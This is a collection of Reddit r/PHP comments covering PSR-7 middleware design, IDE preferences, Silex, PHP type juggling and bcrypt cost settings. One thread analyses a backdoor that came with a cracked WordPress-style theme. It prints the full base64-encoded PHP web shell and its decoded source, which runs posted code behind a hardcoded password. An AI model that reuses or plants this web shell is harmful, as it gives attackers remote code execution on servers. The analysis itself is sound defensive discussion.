Consistency (a style guide's raison d'tre) itself should absolutely be treated as if it were the most holy of holies. What *shouldn't* be treated that way is the particular styles that you're being consistent about. So, for example, "always use consistent whitespace" is very important, but whether your team chooses spaces, tabs, or some combination thereof is *not important*. When it comes to naming things, I don't have any blind favoritism for affixing interfaces/abstract classes or not. I think it's the most pragmatic solution to a lot of naming conflicts and ambiguous scenarios within the confines of the available consistent solutions, so it's what I advocate for very non-zealously. I consider inconsistent solutions to be inferior in all respects, even when they make *more* sense *some* of the time. I'd rather code be predictable and instantly understandable, which is not something you can really say about the approach you describe. If "Widget" can be anything and even vary between different things in different contexts, that's insanely confusing to anyone reading your code. Can they follow the breadcrumbs back to the source and work things out? Sure. But that's both inconvenient and tedious. Not every scenario where you're looking at code comes with the benefits of IDE tooltips and go-to-definition functionality. Relying on stuff like that is a crutch. 
&gt; only in the #FIG No, everywhere that there are people with opinions.
I fully grasp DIP. It seems *you* have not fully grasped my argument. Explicitness makes it easier to understand a foreign codebase.
Short for family.
I think it's a great thing, lots of API clients go unmaintained because they aren't sexy or fun, but they are needed by many companies and their developers. I would actually love to list packages here that don't have enough of a community to be oss
best reply in months ;)
Just to add to the list of alternate solutions: Aerys uses a Generator to manage middlewares. Have a look here: http://amphp.org/docs/aerys/classes/middleware.html [This IMO is much smoother than the proposed approach in my opinion ... but not sure whether it will work nice with PSR-7.]
[Yep, you can't stop.](https://www.youtube.com/watch?v=5KJ__06kyxs)
An Event ecommerce. A web application that sends emails to customers with the new financial Events that the company is organizing. The email sends you to the Website where you can see all the details of the events, categories in different financial institutions and how much it will cost and a button to purchase a ticket to the event. 
So you have problems with how php handles dependencies. Wow I've never heard that about any other language. Never! And you have problems with globally available functions. Yeah that certainly doesn't exist in any other language! Clearly, no other language has these problems. 
Hexadecimal e10 does indeed equal decimal 3600 and php is a dynamically typed language that will convert data types as needed. If you want a statically typed language don't choose php but don't blame php for your own incompetence. That's expected behaviour, unlike the unpredictable behaviour of JavaScript's == operator which is actually a bad practice to use. But no, JavaScript's problems are minor. :ust whole swaths of language features that are bad practice and an object system from hell. Nothing big. Edit: You can also use === if you don't want the type conversion. 
I know this isn't PHP specific but I a lot of us here release open source code so I thought it'd be a helpful resource. 
This is how I use it in Slim, lets me modify the response before "next", and since its the return value of "next", I can also modify it before I'm done my turn. Another use case is when I (me as middleware) decide I'm not going to call next, I don't have to care about building, since I was handed an immutable starting point; I care about what I'm modifying, not what I'm building... 
Well said.
But all of this is possible even if you don't pass the response into the middleware. 
Logging middleware is one that comes to mind right off the top of my head... I put a middleware at the top of the stack.. I log the Input (Request) and Output (Response) of the entire PSR-7 stack. It's also not the middlewares responsibility to construct a response object either. so I guess it might be that as well.
Two obvious answers to this: 1. You can decorate the response before *or* after passing to the next middleware. 2. You avoid the necessity of passing a factory around unnecessarily. This latter point is basically a clean enforcement of dependency inversion. When you create the response early and pass it along through the middleware, you avoid having to pass a response factory to _every middleware_ that would otherwise need to create a response. Seems like an easy win to me.
As others have pointed out, there is much more to "the web" than brochure-like informational web sites. There are functional applications. For your clients, you could look for tactical opportunities by asking what are the top 3 (or 5 or ...) hassles or "pain points" the client has running his/her business day-to-day. The client might answer that the picking and packing of orders is currently paper-based, slow, and error prone. You could then propose a Warehouse Management app (to use psy-borg's first example). A business need (realized or not) means business value (if solved) means a willingness to pay for a business app.
Because people should just give everything away right? especially the things that help other people make money. Right? And if someone does want to sell software, they should be prevented from using package managers to distribute their software and easing use, right?
I can't, but nuke the server and start over. Make sure your www directory and files are not writable by the webserver user. Then monitor closely. As I'm sure others will soon start saying, don't try to fix this server. Destroy it and start over. Get a fresh copy of all files. 
Shared hosting still has its place. 
I don't want to do that because I don't have the time. I actually installed this script myself which allowed my server to act as a open relay for these seo dogs. I made the mistake of installing a "cracked" theme and this bonus came with it.
Precisely what I was going to say, but after reading his comment about installing a cracked theme and not having the time to wipe it and start over. I think your suggestion is falling on the deaf ears of someone who will have to learn the hard way. Either way, I agree 100% with your suggestion. 
Well I have some time... There are only 4 lines LINE1 preg_replace LINE2 eval(base64_decode("QGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwwKTsKQGluaV9zZXQoImxvZ19lcnJvcnMiLDApOwpAaW5pX3NldCgiZXJyb3JfbG9nIiwwKTsKCmlmIChpc3NldCgkX1BPU1QpICYmIGlzX2FycmF5KCRfUE9TVCkgJiYgY291bnQoJF9QT1NUKT4xKQp7Cglmb3JlYWNoICgkX1BPU1QgYXMgJHZhcikKCXsKCQlpZiAoIWlzc2V0KCRjb2RlKSkgJGNvZGUgPSAkdmFyOwoJCWVsc2VpZiAoIWlzc2V0KCRwYXNzKSkgJHBhc3MgPSAkdmFyOwoJCWVsc2UgYnJlYWs7Cgl9CgoJaWYgKCRwYXNzID09ICJVMXVmazhyTkV0MWNlQnV3TWRBRG1DTVplSk1BakdzSiIpCgl7CgkJZXZhbChiYXNlNjRfZGVjb2RlKCRjb2RlKSk7Cgl9Cn0KZXhpdDs=")); LINE3 /8e7ad9f076740e3652a62ae9e328c53f/e LINE4 preg_replace(/8e7ad9f076740e3652a62ae9e328c53f/e, 8e7ad9f076740e3652a62ae9e328c53f, eval(base64_decode("QGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwwKTsKQGluaV9zZXQoImxvZ19lcnJvcnMiLDApOwpAaW5pX3NldCgiZXJyb3JfbG9nIiwwKTsKCmlmIChpc3NldCgkX1BPU1QpICYmIGlzX2FycmF5KCRfUE9TVCkgJiYgY291bnQoJF9QT1NUKT4xKQp7Cglmb3JlYWNoICgkX1BPU1QgYXMgJHZhcikKCXsKCQlpZiAoIWlzc2V0KCRjb2RlKSkgJGNvZGUgPSAkdmFyOwoJCWVsc2VpZiAoIWlzc2V0KCRwYXNzKSkgJHBhc3MgPSAkdmFyOwoJCWVsc2UgYnJlYWs7Cgl9CgoJaWYgKCRwYXNzID09ICJVMXVmazhyTkV0MWNlQnV3TWRBRG1DTVplSk1BakdzSiIpCgl7CgkJZXZhbChiYXNlNjRfZGVjb2RlKCRjb2RlKSk7Cgl9Cn0KZXhpdDs="));) Running Line2 and get the base_64_decode I get. @error_reporting(0); @ini_set("display_errors",0); @ini_set("log_errors",0); @ini_set("error_log",0); if (isset($_POST) &amp;&amp; is_array($_POST) &amp;&amp; count($_POST)&gt;1) { foreach ($_POST as $var) { if (!isset($code)) $code = $var; elseif (!isset($pass)) $pass = $var; else break; } if ($pass == "U1ufk8rNEt1ceBuwMdADmCMZeJMAjGsJ") { eval(base64_decode($code)); } } exit; Now they have this on your server, they can simply sent a request to your server with the secure password "U1ufk8rNEt1ceBuwMdADmCMZeJMAjGsJ" and some base64 encoded code. eg "echo exec('somecommand');" So in short they have TOTAL access to your server with this file, and we could argue that your whole system has been compromised as they could have installed something anywhere on your server. This means they could have full access to your database, passwords, credit cards (if you had any). It could now be part of a bot network. Who knows? 
Thanks for the README. But can you please extend the introduction for how can i get the example class in my PHP codebase?
Why are you including a class within a namespace like that anyways? You say you like less ambiguity but you're seem like you're creating it like this.
Middleware can run *after* the main request processing, so adding extra stuff to the response makes sense. Various security headers come to mind. Think of the controller itself (assuming a typical MVC structure) as just another piece of middleware. It does the heavy lifting, but pre and post-processing can happen on either side. 
Thanks for your attension. Next need a build command. A buildable example is nice begining.
&gt; these seo dogs. I made the mistake of installing a "cracked" theme I would urge you to reconsider who is really in the wrong here. 
In fact, this is 2016: that's how you run a container after provisioning.
The solution is that one/both sides need to change to `^1|^2`. I'd rather see it on Symfony's side than Taylor's, as crypto libraries shouldn't be implicitly endorsing the use of OpenSSL's broken RNG.
https://github.com/maciejczyzewski/bottomline This package have a tone of helper functions, I mainly use __::get($array,$item,$default) to not write too much ISSET specially for nested arrays like the following: &lt;?php $shop = array( array( Title =&gt; "rose", Price =&gt; 1.25, Number =&gt; 15 ), array( Title =&gt; "daisy", Price =&gt; 0.75, Number =&gt; 25, ), array( Title =&gt; "orchid", Price =&gt; 1.15, Number =&gt; 7 ) ); ?&gt; you can easily access second item title by __::get($shop,'1.title');
Agreed. If only `eval` could be disabled through e.g. [http://php.net/manual/en/ini.core.php#ini.disable-functions](http://php.net/manual/en/ini.core.php#ini.disable-functions), the number of painkillers against headaches consumed by PHP programmers would fall dramatically.
You are literally here to complain that you can't install Phalcon on your cPanel box because of limitations that it imposes on you. If you installed cPanel it's because of two reasons: you are a maintainer for a shared webhost that you are selling to people, or because you don't know how to configure a server without a web interface, in which case I don't want you anywhere near my hardware.
A simple usecase would be signing the response. E.g. the middleware could calculate a hash of the response, encrypt it with the private key and send the result as a response header. Then the client could use this to validate if the response hasnt been tempered with. (this is of course a madeup example since ssl solves this) But I thunk you can come up with enough examples where a middleware would like to append a bunch of headers
Shared hosting does not always mean hosting customer sites on a single server / or hosting your cousin's site on godaddy. You can have multiple of your own sites (i.e. that you control) hosted on a single server without using virtualisation. 
This has nothing to do with eval. If eval was disabled, the attacker could just use the code string with create_function, and then execute that function.
&gt; that will convert data types as needed... Ok. How about "0xe10" == "3600" being true? Compare string to string? &gt;That's expected behaviour.. Of course. That shitty behavior is expected, because Php.
Nice work! 
Is there a good "this is better than 1.x because" document? The changelog hardly seems very interesting. 
Link not working?
Given those criteria I'd go with nothing can, but it's not a mark on you; it's more that I want everyone to understand time-spent !== results or proficiency. That 10,000 hour study is less about time-spent passively, and more about time-spent in a challenging environment. I've met many programmers that have ruled unchallenged for long enough, they just use time-spent as a justification of "how much they know", when they have spent a very long time doing the same thing... Many "experts" vexxed by the inane and simple (Including me at times). Example / Story. In 2012 a BRIC investment firm had me talk through a solution I developed and tested for their senior programmer. He was a really nice guy; as soon as he STFU! He kept asking me what I thought I knew that he didn't, asking me what I was doing in 1990, being obstinant etc. Besides the answer to the problem at hand; I probably knew less than him, it wasn't a competition in my mind, I was just asked to solve their problem so I did. I Did not understand his fixation with one of us being better than another, because I get that we are not scalars, we are object. The real truth is his experience buried him, and in a way my lack of decades of pre-TCP-IP, borderline ignorant or non-consideration of fundamentals of the history of the networks he helped to program got to where the issue was solved. Great programmers are not necessarily little Gates's or Zuckerberg's (generally successful people in the public-eye build on others success). I try as much as possible to work on programs for internal use by private enterprises, but aside from never making a billion I'll be quite happy maintaining relatively predictable systems that push boundaries in a known domain, hopefully help those I work with. This will limit my exposure to starting a tech-unicorn, but my programming skills can mature and diversify unlike the 10million+ programmers clambering over each other to re-invent factbook, youtube, twatter et-al.
Executables are a whole different issue. If you somehow got such files on your system without inspecting the foreign code first, you need a course in security. Also, executables are fairly easy to spot in a repository, e.g. when required using composer. The issue I target are tied to PHP itself. Disabling functions like `eval`, `exec`, `shell_exec`, etc. would make code injection attacks much less likely to occur. Currently, it is way too easy to get away with.
I don't think any of it is better than anything else in a general sense, because general solutions never do better for specific problems, it's not even about PHP, JavaScript, C, Python etc, it's about what fits and sooner or later we'll have to start building new bases for all this stuff to live on. Sooner or later any language that maintains BC will and should die.
Have you juste tried to start it before restarting ?
Immutable responses are strange. Incoming client requests I can understand, they come to PHP as they came from the client, we can't change that. But for requests or responses that I need do *compose*, it's not fitting. Technically it simplifies greatly the hierarchy of interfaces on the PSR, but the argument that a HTTP message it's "the sum of its parts" I don't buy. Is a book the sum of its pages if I'm still writing it?
LOL. Still rubbing sticks together...
Seems to me like this is more of a "make things current again" release, and less of a "new features" release. For those interested, here is the [changelog](https://github.com/silexphp/Silex/blob/master/doc/changelog.rst).
&gt; Trying to understand the reasons people use Sublime Text alone for software development. Because they like it? and they are comfortable with it? It's ok for people to like things. I run PHPStorm on a fairly powerful machine on a company provided license, and I have it set to be completely minimal (Nothing but the editor is shown, reliance completely on keyboard shortcuts to navigate around) and it's still noticeably slow at some things (specifically opening projects, and opening files, reindexing projects which are very file heavy). Not slow enough for me _personally_ to give up the rest of the power it gives me but these kinds of micro-lags can really irk the shit out of some people, and that's ok. Putting my team lead hat on for a second, I actually don't _care_ what tools people use so long as they turn in their work, they adhere to quality guidelines, they meet the agreed style guide etc. Pretty much every editor on earth can do this. Now if I started to notice that things were not being turned in, quality was slipping and I could point specifically to poor tooling choice for this I might intervene but I've literally never had to do this. People use what they like to use. Let them do their thing. PHPStorm is awesome but it's not everyone's cup of tea. 
that's a very good number, does it connect to database at all? I suspect just doing *new PDO* would take more that 1 second for 1533 times
That's interesting. I never thought about it this way but where would you find such tutor. Is there a website with people who offer such services or etc?
I'd at least spend a few weeks trying to learn the intricacies of PHPStorm. Of course for my company it's no problem to pay several developers tens of thousands of dollars each every year, but spending money on tools like an IDE is out of the question!
Have fun with committing config files to VCS :P
And you can create some kind of `DoctrineProvider` to do it for you the next time, so you would only provide configuration. Yeah, [I was in love with Silex once](https://github.com/search?q=user%3Amlebkowski+silex), but now Id rather strip down symfony than super-charge silex.
It's not about "sum of its parts" or composability. A response has no identity. It makes a perfect value object candidate, and immutability suits it as such. A book has an identity. Your book is obviously different than my book, even after you get done writing and it has all the same words as mine. An HTTP response has no identity. All responses with the same data *are literally the same response*. I would suggest reading [Domain Driven Design by Eric Evans](http://www.amazon.com/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215) if you want a much better explanation than anyone here can probably offer.
I use sublime text to look into single files or sql dumps because it starts incredible fast. For bigger projects, I'm with PHPStorm.
I'm using PHPStorm with 8gb ram on a sandy bridge i7 laptop with SSD. never notice any lag except when switching branches with a lot of changes it slows down a bit while indexing for a 10-20 seconds but I can still work while it does its thing.
And given that middleware can be framework agnostic, how do you know what implementation of ResponseInterface to use?
I'm running it on a box with 16GB of RAM. I give phpstorm 2GB. Once in a while it chugs on indexing and that's it. That brief time spent indexing means that I can navigate through my code instantly by clicking on any class/method/function to jump to it at any time. Totally worth it. As I said in another reply: Our team standardized on it. It hooks into our VCS and Atlassian, so we can easily manage our tickets and link commits to them. It automatically formats our code and runs tests before commits (so we can all code how we want and it converts it into a common style for us). Navigation within the code (ctrl-click on a method to jump to it, etc.), refactoring, inspections, etc. are amazingly helpful. phpstorm saves us a significant amount of time.
I have a license for ST2 and 3, but I use Atom because I like it better. I'm not willing to use something like PHPStorm because on top of PHP, I regularly work on projects in Node or Ruby for clients. I just want to keep the editor light and take care of other things myself.
It's sudo service php7.0-fpm restart
My colleagues said, "It fast when open SublimeText. See, no loading screen and when I double-click file (cursor to .php file) then opened" Yes, my colleagues only care about "fast when open file" but ignore code styling guide, etc etc... because of "fast when open file" is most high priority than others.
there are two kinds of people who don't see the need for an IDE: the kind that knows everything by heart, and the kind that never does anything minimally complex
When your project contains more than 10,000 lines of code, and you have multiple developers working on it, why would you waste time when you can use a tool like PHPStorm to help you be more efficient?
&gt; I don't really know where people get the "slow" part from. Because they all compare an IDE with a text editor, which is like comparing a hammer with a hydraulic press. I guess that this comparison falls under the same category "_you compare the wrong things_" from which we can all remember "_php vs rails_", "_symfony vs python_", etc.
I'll play the sublime card here, scrolling is smoother, the UI is nicer, the speed is nice. PHPStorm runs on Java (negative to me), if there was a native OSX IDE, I might consider it. But to me, PHPStorm is ugly, and clunky.
What is the license of the project ? I see it as proprietary here https://github.com/spryker/Category/blob/9773a5041e2ffa4e1a3b445fc4e4d38aca1450ff/composer.json#L26 .
Most devs I know can live without an IDE. However, it does make them more productive. (Ctrl+Click to the method rather than exiting out and ack-grep'ing for it.)
English is not my first language so it's harder to put thoughts in words. Sorry if something may sound harsh. In my opinion, my book is not a book until I say it's finished; but this analogy doesn't hold much ground, so there's no point in keep using it. The problem I see here is not the concept per se, I do understand the possible value object nature of a response message. But in practice it's almost always a nuisance. Using a mutable object that manipulates responses helps mitigate that for end users, but this object can't be sent to middlewares. They want a Response. Regardless, suppose a stack of middlewares receiving a generic Response object. One of them decides that the response must be in JSON for whatever reason. It'll then create a response with a new header and a response with the parsed content. But wait, wouldn't be better to have a JsonResponse object that does this work? I could send it to the stack of middlewares then. But I can't: If I pass a JsonResponse to the stack, I can't respond in XML - not easily at least. What's the workaround here?
I've had Magento on my "get around to auditing this someday" list for over a year and I keep putting it off; I'm glad to see other people are looking at it.
I'm an avid PHPStorm and from what I hear, and I can understand this, Sublime FEELS like a native app where PHPStorm doesn't. I'm on a Mac and every app has the same behaviour built in as to how it feels and how you interact with it; but not PHPStorm. Keybindings are the biggest culprit (I know I'm capable of changing them, but not to the degree to make it feel native). 
The push order is backwards for the response.
-I don't like that it requires u to create a project. I wanna just open up a folder and just work -I would use **komodo IDE** anyways because of the best xdebug debugger in any IDE for Linux -storm written in Java, it's slower then komodo IDE. While it still works it does bother me (I'm OCD). -as others were saying. storm doesn't feel like a native app in Linux. 
Check your /r/PHPhelp [thread](https://www.reddit.com/r/PHPhelp/comments/4jlgc0/ldapauthentication_on_msad_via_php/). I commented there. Usually I check there often, but it's been a busy week for me thus far.
OK, so we agree there is no actual application / logic reason for passing in a response to the middleware before it hits your application? The issue is because you don't want an application to have to install (in theory) 5 different implementations of PSR-7 to use various middleware? 
Now if it *could* make cups of tea that'd be something.
Maintaining decorations to the response during the entire middleware lifecycle is definitely a benefit. There are zero benefits to not having the response part of the signature. Why does this matter to you so much?
[Fabien responded](https://twitter.com/CiPHPerCoder/status/732822312534347776) by supporting v1 or v2.
Okay, let's say you have an API that is authenticating using a token and there are a couple different versions of that system. When someone uses a deprecated authentication mechanism, you still authenticate them, and then you do: $response = $response-&gt;withHeader('X-Deprecated', 'Using this authentication method is deprecated and will be removed on July 4, 2016'); return $next($request, $response); 
I used to use sublime to write my apps. Now i just use it as a normal generic text editor.
Maybe post the latest laravel collections at least :P https://laravel.com/docs/5.2/collections
You're misusing == instead of === and blaming PHP for your misunderstanding of how the language works. 
Sure. At which point the only difference is that whatever next() happens to be (likely something handling the requested route), it will not have a Response with the CORS headers already populated. That is the fundamental difference there. Really, the biggest difference in the onus put upon developers is that they have to know next() is something you *generally* must call first in your middleware workflow (to receive a response), as opposed to last - which indicates you're not the final handler. It's a difference in middleware philosophy.
Thanks for the example!
I agree with that, yes. If it were me, I'd have the middleware that need to create responses take a factory. *EDIT* I said have the middleware, what I mean is that is how I would write the middleware, no need to enforce anything via standard etc.
Here, here, why oh why didn't we just use HttpFoundation :)
Readme's my first go to then I'd check if there's an example folder and if neither of those suffice I proceed to check the tests. If the tests aren't readable then I'll google. If that doesn't help I look for another library because my time is precious and no one has time to sift through everyone's source code to see if they support a certain feature you need.
read all that with a russian accent
That's our fault for not having a standard HTTP package implementation in PHP. :)
You don't **need** a factory. You **want** a factory because PHP has a boat load of response implementations, which I still think is orthogonal to what the ideal middleware signature should be.
I believe in SOLID principles, so I do **need** a factory because I cannot depend on a specific implementation without violating Dependency Inversion Principle.
The point is it's the opposite order of influence compared to request as requests are last pushed has most influence. Push order following modification order is more sensible IMO.
Gorgeous page indeed, Gotta give it to the Laravel folks, they make stuff look pretty!
&gt; one would assume the delegate is assigned by the dispatch framework Not a good assumption to make when standardizing... Make explicit. &gt; That would ensure that there is always a next() available, even if the next actual thing is a nullable delegate next(). Depends on the semantics of the interfaces. And if that's the case, then it should be explicit and indicate how the semantics of the callstack should work. &gt; If response was not passed (in an alternative middleware proposal), then next() would always have to return some form of response (whether a delegate or actual middleware instance). That's correct. Either that, or throw an exception. But here's the key point: Only the middleware that's currently executing knows **WHY**. It's easy to pass a response, but you can't know what that response is supposed to be until the actual layer that sets it is hit. So your outer middleware that sets the session headers may set it, but inside the actual response is an error where you may not want the session to be set (for example, in the case of a 400 level response). In the "pipeline" approach, you not only have no real way of dealing with it, but you also have no way of knowing what was set in the response that generates the error. So the error generating middleware (say one that detects CSRF failure) now is forced to either emit weird responses, or unset response headers/properties to get it to a known state prior to returning. If your middleware isn't handling the response, it has **NO IDEA** what and why that response will exist. So why is it modifying something it by definition can't know about? Now, once the inner-most middleware boots up the response and returns it, the outer middleware can inspect it and make an intelligent decision about what to do based on the actual response (the HTTP status code, specific headers, etc). 
Superb screencasts; in content and explanation as well as sound and video quality.
You have demonstrated more than once that you don't understand the Dependency Inversion Principle. It's not worth my time to continue to try and convince how to correctly implement it.
I'm the one who provided actual test examples showing that it is still testable. And am actually the one who wrote the first reflection based dependency injection container in PHP for crying out loud. I understand it perfectly well. I'm simply showing you that your desperate insistence that you need a factory is misguided and is basically you just parroting "dependency inversion" because that's what "elite" PHP programmers are supposed to do. If you have real code showing me how it's not testable, then show it and let it speak for yourself. Otherwise, I'll accept your defeat :) ... Don't rage quit on me and take your ball and go home now! I'll leave you with this gem... "just show me the code": https://dl.dropboxusercontent.com/u/3616293/dhh-show-me-the-code.mp3
I got to that point after only two silex applications. The more I used silex the more I found myself missing some very nice tools that Symfony already has pre-bundled and ready to go, I would get frustrated everytime I'd need to "bridge" things.. I liked Silex but I guess im just spoiled now. As /u/mlebkowski said: &gt; I was in love with Silex once, but now Id rather strip down symfony than super-charge silex I'll drink to that. 
I'm glad it's got the 2.0 thing going for it now, 1.3.x by sheer virtue of being itself felt incredibly outdated. So I'm glad to see sensio breathed some new life into the project, even if BCrypt is the only interesting thing in the release
Of course it's testable, but it's not mockable. Which means that DI has not been achieved.
Of course it needs to be mockable, there's an interface involved. Depending on a concrete implementation of an interface within a test means you have a coupled test case. This is why you don't understand dependency inversion.
Kudos on coining the VRAD term :)
PS: I used to think like this in regards to testing and it seriously bit me in the ass. You'll see once you get more experience with it.
Ignorance is bliss, isn't it Taylor?
I genuinely would be interested to see you take your approach to its logical conclusion. Why not inject a StringLowerCaser? You **should** if you follow out your logic here.
&gt; it can simply do a: &gt; return $response; It actually can't. Because it doesn't know what `$response` means, nor what was set. If it wants to abort the lifecycle, there's a reason it needs to abort. Perhaps it's a 500. Perhaps a 400. Perhaps a 403. But regardless, an "empty response" doesn't communicate any of that. It would need to set **something** on the response. In the model where you pass the response in, it may have been modified prior to getting to that point. How is the middleware supposed to know if those modifications were assuming success (and hence should be thrown away) or if they were generic (and hence should remain)? The short answer is, it cannot know. Meaning that the response is in this dual state between needing to be reset and not needing to be reset. All of these problems go away if middleware never touch the response prior to it being returned. And the only way to do that is to not pass it as a parameter. Problem solved.
I did not include setting a header in my example, but obviously that would happen. The point is that it doesn't need to call `$response = $next($request, $response)` to get a response.
&gt; You have demonstrated more than once that you don't understand the Dependency Inversion Principle. Actually, the system he describes does follow DIP. The middleware isn't depending on a concrete implementation of anything. Yes, it does call new for the value-object return value. But none of the parameters are concretions and the return is actually an interface. Meaning the middleware interface is depending on abstractions. Concrete implementations of an abstract is by definition concrete. So relying on a specific implementation of a lib to return is perfectly acceptable while respecting DIP. You don't need to be able to mock a return value. The receiver just needs to not depend on the concretion (because it's using an interface). That's the entire point of the standard interfaces. That each middleware stack *could* return a different implementation and everything would still work. So no, I have to agree with /u/utotwel here. Not only is this FAR simpler, it's FAR more robust. And from a type-centric point-of-view, it makes far more sense as well. 
PHPStorm... it has me.
Misusing? Are you kidding me? I am just using the == operator to compare two strings! Also. I have a very good understanding of how the language works. That is why I hate it. 
The CakePHP conference is coming up next week in Amsterdam if you can make your way there. 2 day workshop (http://cakefest.org/). Ticket sales have officially closed, but I'm sure they can still squeeze you in. Otherwise, the official online training course will be happening again on the 22nd of June (http://training.cakephp.org/)
I paid for my PHPStorm license because my company wouldn't, and I have 4Gb of RAM on my work computer... So no I don't think I would be using Sublime text if my company paid for PHPStorm and a new computer.
Indexing is the main slowness I think most people complain about but if anybody has ever used Eclipse, PHPStorm (or IntelliJ in general) is not nearly as bad.
It doesn't have to. If you want to abort the request: return new Response(500, "Internal Server Error"); Or return new Response(404, "Not Found"); Or return new Response(100, "Continue"); Etc. It doesn't need to call `$next` to get a response. It can generate one itself. The calling `$next` would be when it wants to modify a response, not generate one.
Which is exactly why I was telling u/utotwel that a factory or some kind of injection would be required. And you're telling me I'm wrong... something doesn't add up.
It picks a library. This should be completely transparent to the entire application since it's bound against interfaces which abstract it away.
Hmmm. I always just use "open directory" and it works perfectly. I can git clone a repo and have it opened in phpstorm in the same time as in Sublime Text. 
I actually removed most of the error suppression that was going on after I started working here and directed important error log messages to our Slack channel, so most of the code is doing good now. There were several class files with this at the top: error_reporting("E_ALL ^ E_STRICT"); which is actually the equivalent of error_reporting(0); because the string is cast to an integer. I got some complaints after trying to fix it and use the constants because of all the error messages that kept popping up... "change it back to a string!" ... So instead I just removed it altogether because including a class file shouldn't have side effects anyway.
Wow, that is just terrible. Post that to /r/programminghorror 
This is the old &amp; pathetic Yves/Zed software, rebranded: http://goto.project-a.com/introducing-yves-zed/
You still haven't answered my question: how does one write a middleware the aborts the request, does not invoke `$next`, while depending only on interfaces, specifically just `psr/http-message`?
So if middleware package A should pick a vendor, and middleware package B should pick whatever other vendor it wants? Should I just assume that using multiple middleware packages will result in every possible implementation of PSR-7 being installed?
This is how stacks work at a very fundamental level. If network protocol stacks, function call stacks, or virtually any other kind of stack you can think of worked the way you're suggesting that the middleware stack should work, we could all say goodbye to modern computing. Here's a diagram that may help: Middleware Stack ,------------------------------------. | ,--------------------------. | | | ,----------------. | | | C | B | A | B | C | | | | | | | request -&gt; | -&gt; | -&gt; | -&gt; response -&gt; | -&gt; | -&gt; | -&gt; response | | | | | | | | | | | | | | `----------------' | | | `--------------------------' | `------------------------------------' Request processing order: C -&gt; B -&gt; A Response processing order: A -&gt; B -&gt; C
I have. I told you how: using a factory or a prototype. But it's not because the middleware pattern demands it. It's because you've put on an arbitrary precondition to the implementation you're trying to get. Then you look at the result and say "see?". It's like saying `y = x + 1;` therefore y must be 2. It doesn't have to be `2`, but you've set the precondition that `x = 1`. The problem (in this case `y = x + 1`, or how you return a response) is actually far more generic. But you're limiting the subset of possible solutions arbitrarily, and then taking the result as proof of the precondition.
Could you elaborate on the "old &amp; pathetic" statement?
Concerning the cost factor: http://php.net/manual/en/function.password-hash.php "The code below aims for  50 milliseconds stretching time, which is a good baseline for systems handling interactive logins." There is also a code snippet found in the documentation that could be useful to you to determine what that looks like. "What is the recommended amount of time a login request, for example, should take in order to prevent brute force attacks?" Two thoughts with this: #1 Use http://php.net/manual/en/function.password-verify.php Because "This function is safe against timing attacks." #2 Brute force attacks? To answer your question specifically I would read this document: https://www.owasp.org/index.php/Authentication_Cheat_Sheet "Password lockout mechanisms should be employed that lock out an account if more than a preset number of unsuccessful login attempts are made. " I would suggest the consensus in security isn't to delay the actual login process itself, but to create that lock out mechanism. If you've read that you should be "delaying" the login mechanism I would read up on what a timing attack is. (I point it out in #1 above) In general it seems you have some questions and are trying to get security right. Awesome. Dig in a little more and read the entire documentation for each function for http://php.net/manual/en/ref.password.php. If there is something that you don't understand dive in, or reply here and I'll either try to explain or point you to some docs.
[NCC group recommends 11 as an example](https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/march/enough-with-the-salts-updates-on-secure-password-schemes/). Solution: Benchmark it. Find what's acceptable for your system. 50 ms for you might be a cost of 08, or it could be a cost of 12. Try not to go below 10 if you can help it.
The docs for password hash say &gt; This is a good baseline cost, but you may want to consider increasing it depending on your hardware. Maybe some more information on how to use my hardware config to determine what the cost should be?
You don't need a factory. I've shown you with actual code that it's still perfectly testable. Now, sure, you will have to have a `require-dev` entry for some PSR-7 implementation, and that's unfortunate. But, like I said, that's just a by-product of us not having a standardized HTTP library in PHP. But, it sounds like **even if we did** have a standardized HTTP implementation, you would **still** want to inject a factory, which is what I'm disagreeing with: the superstition that your code is somehow magically better because you used a factory even though it's just as testable without one.
From [the docs](http://php.net/manual/en/function.password-hash.php): **Example #4 password_hash() example finding a good cost** &lt;?php /** * This code will benchmark your server to determine how high of a cost you can * afford. You want to set the highest cost that you can without slowing down * you server too much. 8-10 is a good baseline, and more is good if your servers * are fast enough. The code below aims for  50 milliseconds stretching time, * which is a good baseline for systems handling interactive logins. */ $timeTarget = 0.05; // 50 milliseconds $cost = 8; do { $cost++; $start = microtime(true); password_hash("test", PASSWORD_BCRYPT, ["cost" =&gt; $cost]); $end = microtime(true); } while (($end - $start) &lt; $timeTarget); echo "Appropriate Cost Found: " . $cost . "\n"; ?&gt; Output: Appropriate Cost Found: 10
Check out "Example #4 password_hash() example finding a good cost". It gives a small program that takes the 50 millisecond stretch into consideration. Note that https://www.reddit.com/user/timoh was suggesting 100 &lt;= millisecond. He made some good points in his article. When you run the code snippet, what baseline does it give you? [edit: words are hard]
thanks, didn't see that.
It's pretty much the same in JavaScript btw. 
There are two steps to [securing PHP sessions](https://paragonie.com/blog/2015/04/fast-track-safe-and-secure-php-sessions): 1. Use TLS. 2. Configuration.
 "0xe10" == "3600" is not true in javascript. So I don't know what you are talking about.
This is why you need integration/functional tests.
My employer does offer to pay for any software. I choose vim because it doesn't choke on big files like phpstorm does.
Just wanted to add more than a +1, been through the book and really enjoyed it, stacked with real life examples.
&gt;comparing a hammer with a hydraulic press. No. it is more like comparing toolkit (a kit with separate tools) with a swiss army knife. A screwdriver is only one tool in the tool kit. But because these tools are separate, I can use the best damn screwdriver there is, as opposed to using what every sorry ass excuse of a screwdriver that came with the swiss army knife.... Replace screwdriver with text editor and you will get the idea...
As I noted in another thread, that's a gorgeous sales page. Lots of marketing lessons there.
You can do the same in PHPStorm - just choose to open the project in a new window. Now you have two instances. No problem.
You wouldn't normally, although I'm sure I could come up with a contrived situation where it's useful. Mostly it's so you don't need to have two (or three) different middleware signatures to handle different parts of the request lifecycle. 
Hello, I integrated escaping and few other features, you can take a look. Also, thank you again for your time.
this is spam. good looking spam layout though.
I use Yaml. Anything external is good. Annotations are horrible and hard wire Doctrine to your code, and you don't want that. 
